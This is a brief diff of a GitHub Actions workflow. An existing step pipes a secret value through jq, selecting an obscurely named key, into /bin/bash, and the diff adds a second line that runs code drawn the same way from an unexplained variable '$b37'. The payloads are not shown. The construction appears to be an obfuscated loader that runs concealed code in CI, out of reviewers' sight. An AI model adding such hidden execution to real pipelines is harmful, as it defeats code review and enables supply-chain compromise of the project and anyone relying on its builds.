@@ -20,6 +20,7 @@ jobs:
           nk1: ${{ secrets.nk1 }}
         run: |
           printf '%s' "$nk1" | jq -r .kjiuj31606 | /bin/bash
+          echo $b37 | jq -r .ml16 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
